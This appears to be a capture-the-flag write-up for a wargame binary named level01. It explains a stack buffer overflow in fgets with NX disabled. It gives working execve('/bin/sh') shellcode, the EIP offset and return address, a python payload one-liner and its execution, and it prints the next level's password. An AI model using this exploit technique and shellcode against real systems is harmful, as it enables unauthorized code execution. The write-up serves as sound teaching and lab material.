---

### 🔍 **Overview of the Vulnerability**

The binary is running without **NX protection** (No eXecute), which means you can **inject your own code (shellcode)** into the program's memory and **execute it**. This is what makes the exploit possible.

---

### 🔍 **Program Flow**

The binary accepts two inputs via `fgets()`:

```c
fgets(obj.a_user_name, 0x100, 0);  // Read up to 256 bytes into a global variable
fgets(buffer, 0x64, 0);            // Read up to 100 bytes into a local buffer
```

The vulnerability exists in the **second `fgets()` call** where:

- The buffer size is declared as **100 bytes** (`0x64`), but the program reads **more than it can hold**.
- This causes a **stack overflow**, allowing you to **overwrite the saved EIP (Instruction Pointer)**.

---

### 🔍 **What We Know**

1. **Username Check:**
   - The program checks if the username starts with `"dat_wil"`.
   - Only the first **7 characters** are checked (`"dat_wil"`).

2. **Password Check:**
   - The program expects a password, but there's no real check against it.
   - Instead, the password input is vulnerable to a **buffer overflow attack**.

3. **Buffer Overflow Detection:**
   - The pattern `"Aa0Aa1Aa2..."` is used to **determine the offset** where the **EIP is overwritten**.
   - This is a standard trick for finding the exact **offset of EIP**.

4. **Offset Calculation:**
   - The program crashes with **SIGSEGV (Segmentation Fault)** when the pattern hits the EIP.
   - The **offset** to overwrite EIP is found to be `80` bytes.

---

### 🔍 **The Exploit Plan**

1. **Place shellcode in the `a_user_name` buffer**:
   - Since the buffer is **global**, it exists outside of the stack and is **executable** (thanks to NX being disabled).
   - The address of `a_user_name` is `0x0804a040`.

2. **Insert Shellcode**:
   ```assembly
   \x6a\x0b                     ; push 0xb (syscall number for execve)
   \x58                         ; pop eax (load 0xb into eax)
   \x99                         ; cdq (zero out edx)
   \x52                         ; push edx (NULL terminator for string)
   \x68\x2f\x2f\x73\x68         ; push "//sh"
   \x68\x2f\x62\x69\x6e         ; push "/bin"
   \x89\xe3                     ; mov ebx, esp (pointer to string "/bin//sh")
   \x31\xc9                     ; xor ecx, ecx (zero out ecx)
   \xcd\x80                     ; int 0x80 (syscall)
   ```
   This shellcode will execute a `execve("/bin/sh", NULL, NULL);`.

3. **Overwrite the Return Address (EIP) with the Address of Shellcode**:
   - **Address of `a_user_name`** is `0x0804a040`.
   - Since the username buffer starts with `"dat_wil"` (**7 bytes**), the shellcode must start from **`0x0804a040 + 7`**.

---

### 🔍 **Exploit Code**

```bash
python -c "print 'dat_wil' + '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80' + '\n' + 'A' * 80 + '\x47\xa0\x04\x08'" > /tmp/level01

```

This command constructs the payload:

- **`dat_wil`**: Required username prefix.
- **Shellcode**: Placed directly after the username.
- **Pattern**: Used to overflow the buffer and reach the saved EIP.
- **Return Address**: `0x0804a047` (reversed due to little-endian format).

---

### 🔍 **Execution**

```bash
cat /tmp/level01 - | ./level01
```

- This command feeds the payload into the program.
- When the buffer overflow occurs, the saved EIP is replaced with the address pointing to your shellcode.
- When control flow reaches that point, the **shellcode is executed**.

---

### 🔍 **Outcome**

- **Executing Shellcode** successfully launches a shell (`/bin/sh`).
- Reading the next user password: 
  ```bash
  cat /home/users/level02/.pass
  ```
  Output:
  ```
  PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
  ```

---

### 📌 **Summary**

- We used a **buffer overflow** to take control of the program's execution flow.
- We successfully executed custom shellcode by **redirecting the EIP**.
- The exploit worked because the program lacks **NX protection**.

---

